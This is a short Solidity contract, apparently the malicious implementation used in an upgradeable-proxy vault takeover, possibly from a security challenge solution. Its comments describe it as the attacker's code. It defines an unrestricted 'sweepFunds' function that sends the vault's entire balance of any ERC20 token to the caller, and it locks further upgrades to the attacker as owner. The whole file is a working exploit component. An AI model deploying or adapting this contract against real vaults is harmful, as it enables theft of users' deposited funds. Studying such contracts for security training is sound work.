// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MeticulousVaultImpl is OwnableUpgradeable, UUPSUpgradeable {
    // Allows attacker account to retrieve any tokens
    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }

    // By marking this internal function with `onlyOwner`, we only allow the attacker to authorize an upgrade
    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}
}
